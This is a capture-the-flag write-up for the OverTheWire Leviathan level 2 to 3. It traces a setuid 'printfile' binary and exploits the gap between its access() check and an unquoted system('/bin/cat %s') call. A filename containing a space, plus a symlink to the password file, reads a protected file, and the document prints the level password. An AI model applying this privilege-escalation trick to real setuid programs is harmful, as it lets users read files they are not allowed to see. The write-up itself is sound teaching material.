## 2 -> 3

### Writeup

I inspected the printfile binary using radare2 and observed that it performs a check using access(), before calling cat on the supplied file. When we run ltrace to see how the program handles no input using "ltrace ./printfile", this access function isn't called – so we can conclude that we at least need the input of one file. If we give it .bashrc, we get this output from ltrace…

```
leviathan2@leviathan:$ ltrace ./printfile .bashrc
_libc_start_main["./printfile", ".bashrc"] <unfinished ...>
access(".bashrc", 4)                                 = 0
snprintf("/bin/cat .bashrc", 511, "/bin/cat %s", ".bashrc")    = 16
geteuid()                                           = 12002
geteuiid()                                          = 12002
setreuid(12002, 12002)                              = 0
system("/bin/cat .bashrc"export GAMEHOSTNAME=${GAMEHOSTNAME:-$HOSTNAME}
```

The most interesting part of this is that the program's uid is restored, implying that it's uid is (probably) 0 when it runs cat. This means that cat is run as root! If we can find a way to bypass the access function, we could run cat on /etc/leviathan_pass/leviathan3. An idea perform is to see if the program runs access() on one file and cat on another.

I then tried running "ltrace ./printfile .bashrc .bash_logout", which revealed that access and cat only run on the first file, the second being ignored. I wondered what would happen if the program had to check a file that contained a space in it eg: "meow meow.txt", so I made a directory and made 3 files, "meow meow.txt", "meow" and "meow.txt" (all contain a string that says which file the output belongs to), and then ran './printfile /tmp/tmp.Kt0yAebSto/"meow meow.txt"'

```
leviathan2@leviathan:/tmp/tmp.Kt0yAebSto$ vi meow.txt
leviathan2@leviathan:/tmp/tmp.Kt0yAebSto$ vi meow
leviathan2@leviathan:/tmp/tmp.Kt0yAebSto$ vi "meow meow.txt"
leviathan2@leviathan:/tmp/tmp.Kt0yAebSto$ /home/leviathan2/printfile "meow meow.txt"
this is meow
this is meow.txt
leviathan2@leviathan:/tmp/tmp.Kt0yAebSto$ ltrace /home/leviathan2/printfile "meow meow.txt"
_libc_start_main["./printfile", "meow meow.txt"] <unfinished ...>
access("meow meow.txt", 4)                         = 0
snprintf("/bin/cat meow meow.txt", 511, "/bin/cat %s", "meow meow.txt")   = 22
geteuid()                                           = 12002
geteuiid()                                          = 12002
setreuid(12002, 12002)                              = 0
system("/bin/cat meow meow.txt"this is meow
this is meow.txt
<no return ...>
--- SIGCHLD (Child exited) ---
... system resumed> )                               = 0
+++ exited (status 0) +++
```

Interestingly, meow and meow.txt gets cat'ed, but "meow meow.txt" doesn't, yet access() is checking "meow meow.txt". With this improper handling of inputs, we now have a method of cat'ting any file.

Since we can't make a file called "/etc/leviathan_pass/leviathan3", it would make sense to copy that into the directory with a different name, but we can't do that either. This means that our only option for renaming is using a symbollic link. Following the meow structure, this works and gives us the flag.

```
leviathan2@leviathan:/tmp/tmp.Kt0yAebSto$ rm meow
leviathan2@leviathan:/tmp/tmp.Kt0yAebSto$ ln -s /etc/leviathan_pass/leviathan3 ./meow
leviathan2@leviathan:/tmp/tmp.Kt0yAebSto$ ls -la
total 8
drwxrwxrwx  2 leviathan2 leviathan2  100 Jul  4 04:06 .
drwxrwxrwx  1 leviathan2 leviathan2  4040 Jul  4 04:06 ..
lrwxrwxrwx  189 root      root       30 Jul  4 04:06 meow -> /etc/leviathan_pass/leviathan3
-rw-r--r--  1 leviathan2 leviathan2  22 Jul  4 04:02 meow meow.txt
-rw-r--r--  1 leviathan2 leviathan2  17 Jul  4 04:01 meow.txt
leviathan2@leviathan:/tmp/tmp.Kt0yAebSto$ /home/leviathan2/printfile "meow meow.txt"
PiEpxxknZH
leviathan2@leviathan:/tmp/tmp.Kt0yAebSto$
```

<details>
<summary>Flag</summary>
PiEpxxknZH
</details>